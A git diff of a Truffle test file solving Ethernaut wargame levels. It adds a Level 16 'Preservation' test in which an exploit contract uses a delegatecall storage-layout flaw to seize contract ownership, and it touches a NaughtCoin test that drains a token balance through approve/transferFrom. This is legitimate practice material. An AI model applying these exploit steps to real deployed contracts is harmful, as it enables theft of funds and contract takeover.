@@ -23,6 +23,9 @@ const GatekeeperTwo        = artifacts.require("GatekeeperTwo");
 const GatekeeperTwoExploit = artifacts.require("GatekeeperTwoExploit");
 const NaughtCoin           = artifacts.require("NaughtCoin");
 const NaughtCoinExploit    = artifacts.require("NaughtCoinExploit");
+const LibraryContract      = artifacts.require("LibraryContract");
+const Preservation         = artifacts.require("Preservation");
+const PreservationExploit  = artifacts.require("PreservationExploit");
 
 const { expectRevert }     = require('@openzeppelin/test-helpers');
 
@@ -311,7 +314,7 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await NaughtCoin.new(owner);
 			const balanceCurrent = await contract.balanceOf(owner);
-			await contract.approve(hacker, balanceCurrent); // publicly available and unprotected ERC20 method, approve hacker to spend crypto
+			await contract.approve(hacker, balanceCurrent); // calling publicly available and unprotected ERC20 methods "approve" and "transferFrom"
 			await contract.transferFrom(owner, hacker, balanceCurrent, {from: hacker});
 			const balanceNew = await contract.balanceOf(owner);
 			assert.equal(balanceNew, 0, "Failed to pass level 15."); // make the target's balance zero to pass the level
@@ -325,6 +328,26 @@ contract("Ethernaut", (accounts) => {
 			const balanceNew = await contract.balanceOf(owner);
 			assert.equal(balanceNew, 0, "Failed to pass level 15.");
 			*/
+		});
+	});
+
+	describe("Level 16 - Preservation", async () => {
+		it("Deploy LibraryContract, Preservation, and PreservationExploit Contracts", async () => {
+			let deployed = await LibraryContract.deployed();
+			assert(deployed, "LibraryContract contract is not deployed.");
+			deployed = await Preservation.deployed();
+			assert(deployed, "Preservation contract is not deployed.");
+			deployed = await PreservationExploit.deployed();
+			assert(deployed, "PreservationExploit contract is not deployed.");
+		});
+		it("Exploit", async () => {
+			const library = await LibraryContract.new();
+			const contract = await Preservation.new(library.address, library.address);
+			const exploit = await PreservationExploit.new();
+			await contract.setFirstTime(exploit.address); // "delegatecall" to LibraryContract will overwrite "timeZone1Library" address due to incorrectly defined storage in LibraryContract
+			await contract.setFirstTime((new Date()).getTime(), {from: hacker});
+			const ownerCurrent = await contract.owner();
+			assert.equal(hacker, ownerCurrent, "Failed to pass level 16."); // become the owner to pass the level
 		});
 	});
 });
